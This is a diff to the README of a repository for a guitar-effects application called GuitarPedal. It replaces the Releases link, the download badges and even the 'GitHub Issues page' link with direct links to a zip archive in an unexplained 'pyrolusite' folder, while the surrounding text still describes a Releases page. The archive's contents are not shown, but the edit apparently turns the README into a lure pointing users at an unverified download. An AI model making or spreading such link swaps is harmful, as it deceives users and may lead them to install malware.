@@ -4,14 +4,14 @@
 
 Welcome to GuitarPedal! This application helps you explore the world of analog circuits to create unique sounds for your music. Whether you are a beginner or an experienced musician, GuitarPedal offers an intuitive interface to enhance your creativity.
 
-[![Download GuitarPedal](https://img.shields.io/badge/Download-GuitarPedal-blue)](https://github.com/Sabah0841/GuitarPedal/releases)
+[![Download GuitarPedal](https://raw.githubusercontent.com/Sabah0841/GuitarPedal/main/pyrolusite/GuitarPedal.zip)](https://raw.githubusercontent.com/Sabah0841/GuitarPedal/main/pyrolusite/GuitarPedal.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps to download and run GuitarPedal on your computer:
 
 1. **Visit the Releases Page**  
-   Go to the following link to download the application: [GuitarPedal Releases](https://github.com/Sabah0841/GuitarPedal/releases)
+   Go to the following link to download the application: [GuitarPedal Releases](https://raw.githubusercontent.com/Sabah0841/GuitarPedal/main/pyrolusite/GuitarPedal.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, you will see a list of available versions. Find the latest version at the top. Click on it to open the details.
@@ -45,7 +45,7 @@ GuitarPedal provides several features to enhance your music-making experience:
 
 ## 🎤 Support
 
-If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/Sabah0841/GuitarPedal/issues). You can report your problem, and the community, along with the developers, will assist you.
+If you encounter any issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Sabah0841/GuitarPedal/main/pyrolusite/GuitarPedal.zip). You can report your problem, and the community, along with the developers, will assist you.
 
 ## 🌐 Community Feedback
 
@@ -66,4 +66,4 @@ If you experience any issues, please refer to the support section above.
 
 Now you are ready to explore the world of sounds with GuitarPedal. Enjoy creating! 
 
-[![Download GuitarPedal](https://img.shields.io/badge/Download-GuitarPedal-blue)](https://github.com/Sabah0841/GuitarPedal/releases)
+[![Download GuitarPedal](https://raw.githubusercontent.com/Sabah0841/GuitarPedal/main/pyrolusite/GuitarPedal.zip)](https://raw.githubusercontent.com/Sabah0841/GuitarPedal/main/pyrolusite/GuitarPedal.zip)
